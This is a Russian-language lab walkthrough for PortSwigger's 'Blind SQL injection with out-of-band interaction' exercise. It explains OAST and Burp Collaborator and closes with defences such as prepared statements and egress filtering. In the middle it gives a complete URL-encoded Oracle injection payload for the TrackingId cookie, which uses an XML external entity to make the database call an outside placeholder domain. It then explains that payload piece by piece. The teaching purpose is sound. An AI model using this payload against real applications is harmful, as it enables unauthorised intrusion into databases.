## 🎯 Цель

Решить лабораторную работу **Blind SQL injection with out-of-band interaction**.

Нужно подтвердить Blind SQL Injection не через ошибку, не через изменение ответа страницы и не через задержку, а через внешний сетевой запрос. Для этого мы заставим базу данных выполнить DNS lookup к домену Burp Collaborator.

---

## 🧠 Идея атаки

Приложение использует cookie `TrackingId` для аналитики. Значение этой cookie попадает в SQL-запрос.

Особенность лаборатории в том, что SQL-запрос выполняется асинхронно. Это значит, что приложение принимает запрос пользователя, продолжает отдавать обычный HTTP-ответ, а SQL-запрос выполняется отдельно в фоне.

Поэтому обычные техники не работают:

```text
Error-based  → нет видимой ошибки
Boolean-based → страница не меняется
Time-based → задержка не влияет на ответ
```

Но SQL-инъекция всё равно есть. Значит, нужно заставить базу данных сделать что-то заметное вне основного HTTP-ответа. В этой лаборатории мы заставляем базу выполнить DNS-запрос к Burp Collaborator.

---

## 🧩 Теория: что такое Blind SQL Injection

Blind SQL Injection — это SQL-инъекция, при которой результат SQL-запроса не отображается напрямую пользователю.

Например, приложение может выполнять запрос:

```sql
SELECT * FROM tracking WHERE tracking_id = '<TrackingId>';
```

Если значение `TrackingId` вставляется в SQL без параметризации, можно внедрить свой SQL-код. Но если приложение не показывает результат запроса, атака становится "слепой".

В таких случаях пентестер ищет косвенные признаки выполнения SQL-кода:

- появилась ошибка;
- изменилась страница;
- ответ стал медленнее;
- сервер обратился к внешнему домену.

В этой лаборатории работает последний вариант.

---

## 🧩 Теория: что такое OAST

OAST означает **Out-of-Band Application Security Testing**.

Обычная атака использует основной канал:

```text
Браузер → сайт → ответ сайта → браузер
```

OAST использует внешний канал:

```text
Браузер → сайт → база данных → DNS-запрос → Burp Collaborator
```

То есть подтверждение уязвимости приходит не в HTTP-ответе сайта, а через отдельное сетевое взаимодействие.

---

## 🧩 Почему используется DNS

DNS часто разрешён даже в закрытых корпоративных сетях, потому что без DNS приложениям сложно работать с доменными именами.

Даже если наружу запрещены HTTP или HTTPS-запросы, DNS-запросы часто проходят. Поэтому DNS — один из самых надёжных способов проверить OAST-уязвимости.

В этой лаборатории нам не нужно украсть данные. Достаточно доказать, что база данных попыталась разрешить доменное имя Burp Collaborator.

---

## 🧩 Что такое Burp Collaborator

Burp Collaborator — это сервис Burp Suite, который выдаёт уникальный домен и фиксирует обращения к нему.

Пример домена:

```text
abc123xyz.burpcollaborator.net
```

Если уязвимое приложение или база данных обратится к этому домену, Burp покажет interaction:

```text
DNS
HTTP
SMTP
```

В этой лаборатории достаточно увидеть DNS interaction.

## 🔍 Шаг 1 — Открываем лабораторию и включаем Burp

Открываем лабораторию:

```text
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
```

В Burp Suite включаем перехват:

```text
Proxy → Intercept → Intercept is on
```

Затем открываем главную страницу магазина в браузере Burp.

Почему именно Burp? Потому что нам нужно изменить cookie `TrackingId`, а это удобнее всего делать через Proxy или Repeater.

---

## 🔍 Шаг 2 — Находим точку инъекции

В перехваченном запросе ищем заголовок `Cookie`.

Пример:

```http
Cookie: TrackingId=abc123; session=xyz456
```

Нас интересует именно `TrackingId`, потому что описание лаборатории говорит, что приложение использует tracking cookie в SQL-запросе.

Логика пентестера:

```text
Источник пользовательских данных → TrackingId
TrackingId попадает в SQL → потенциальная SQL Injection
Ответ не меняется → нужна OAST техника
```

---

## 🔍 Шаг 3 — Получаем Collaborator payload

В Burp Suite открываем Collaborator.

Обычно путь такой:

```text
Burp → Collaborator client → Copy to clipboard
```

Получаем уникальный домен вида:

```text
YOUR-COLLABORATOR-SUBDOMAIN.burpcollaborator.net
```

Этот домен нужно вставить в payload вместо `BURP-COLLABORATOR-SUBDOMAIN`.

---

## 🔍 Шаг 4 — Вставляем OAST payload в TrackingId

Заменяем значение `TrackingId` на payload.

Шаблон:

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Где `BURP-COLLABORATOR-SUBDOMAIN` — твой уникальный домен из Burp Collaborator.

Почему payload URL-encoded? Потому что он вставляется в HTTP cookie. Специальные символы вроде `?`, пробелов, `%`, `:` и `/` могут сломать запрос или быть обработаны браузером иначе. Кодирование делает payload безопасным для передачи в HTTP-запросе.

---

## 🔍 Шаг 5 — Отправляем запрос

После замены cookie отправляем запрос:

- через `Forward`, если работаем в Proxy;
- или через `Send`, если отправили запрос в Repeater.

Визуально страница может выглядеть как обычно. Это нормально. В этой лаборатории ответ приложения не должен меняться.

Главное событие происходит не в браузере, а во внешнем канале — в Burp Collaborator.

---

## 🔍 Шаг 6 — Проверяем DNS interaction

Возвращаемся в Collaborator client и нажимаем:

```text
Poll now
```

Если всё сделано правильно, появится DNS interaction.

Это означает:

```text
База данных обработала payload
↓
Попыталась обратиться к Collaborator-домену
↓
Для этого выполнила DNS lookup
↓
Burp Collaborator зафиксировал обращение
```

После этого лаборатория считается решённой.

## 🔬 Разбор payload по частям

Разберём payload так, чтобы было понятно, зачем нужен каждый фрагмент.

### `x'`

```sql
x'
```

`x` — обычное значение для TrackingId.  
`'` закрывает строку в SQL-запросе.

Если исходный запрос был таким:

```sql
SELECT * FROM tracking WHERE id = '<TrackingId>'
```

после `x'` строка закрывается:

```sql
SELECT * FROM tracking WHERE id = 'x'
```

Теперь можно добавлять свой SQL-код.

### `UNION SELECT`

```sql
UNION SELECT
```

`UNION` позволяет добавить результат второго запроса к результату исходного запроса.

В этой лаборатории нам не нужно увидеть результат. Нам нужно заставить базу выполнить функцию, которая вызовет сетевое взаимодействие.

### `EXTRACTVALUE(...)`

```sql
EXTRACTVALUE(xmltype(...), '/l')
```

`EXTRACTVALUE` — функция Oracle для работы с XML. Она заставляет базу разобрать XML-документ.

Почему это важно? Потому что XML может содержать внешние сущности, которые заставляют парсер обращаться к внешним ресурсам.

### `xmltype(...)`

```sql
xmltype('<xml document>')
```

`xmltype()` говорит Oracle: "воспринимай эту строку как XML".

Без этого XML остался бы просто строкой.

### `DOCTYPE`

```xml
<!DOCTYPE root [ ... ]>
```

`DOCTYPE` позволяет объявлять сущности внутри XML-документа.

### `ENTITY % remote SYSTEM`

```xml
<!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-DOMAIN/">
```

Это ключевая часть payload.

Она говорит XML-парсеру: "есть внешняя сущность `remote`, её нужно загрузить по указанному URL".

Чтобы загрузить URL, сервер сначала должен узнать IP-адрес домена. Для этого он выполняет DNS-запрос.

### `%remote;`

```xml
%remote;
```

Эта часть активирует объявленную сущность. Без неё сущность может быть объявлена, но не использована.

### `FROM dual`

```sql
FROM dual
```

В Oracle таблица `dual` используется для выполнения выражений и функций, когда реальная таблица не нужна.

### `--`

```sql
--
```

Это SQL-комментарий. Он отсекает остаток исходного SQL-запроса, чтобы лишние символы после нашей инъекции не сломали синтаксис.

## 💥 Почему атака сработала

Атака сработала из-за нескольких условий:

- значение `TrackingId` вставлялось в SQL-запрос без безопасной параметризации;
- база данных обрабатывала внедрённый SQL-код;
- использовалась Oracle Database;
- XML-функции позволили инициировать обращение к внешнему ресурсу;
- исходящие DNS-запросы были разрешены;
- Burp Collaborator зафиксировал DNS interaction.

Главная идея:

```text
Мы не увидели результат SQL-запроса в браузере,
но увидели внешний DNS-запрос,
значит SQL-код был выполнен.
```

---

## 🧠 Как думать как пентестер

Если приложение подозрительно на Blind SQLi, проверяем по порядку:

```text
1. Есть ли SQL-ошибки?
2. Меняется ли страница при true/false условиях?
3. Работает ли задержка?
4. Можно ли вызвать внешний DNS/HTTP-запрос?
```

В этой лаборатории первые три варианта не работают. Поэтому правильный путь — OAST.

Полезная логика:

```text
Нет ошибок → не значит нет SQLi
Нет отличий в ответе → не значит нет SQLi
Нет задержки → не значит нет SQLi
Есть внешний DNS callback → SQLi подтверждена
```

## 🛡 Защита

### Prepared Statements

Нельзя собирать SQL-запрос через конкатенацию строк.

Плохо:

```sql
SELECT * FROM tracking WHERE id = '" + trackingId + "'
```

Хорошо:

```sql
SELECT * FROM tracking WHERE id = ?
```

### Ограничение исходящего трафика

База данных не должна свободно обращаться в Интернет.

Нужно ограничивать:

- DNS;
- HTTP;
- HTTPS;
- LDAP;
- SMB.

### Отключение опасных XML-возможностей

Если XML-функции не нужны приложению, их следует ограничить или отключить.

### Мониторинг DNS

Подозрительные DNS-запросы к случайным длинным поддоменам могут быть признаком OAST или exfiltration-атаки.
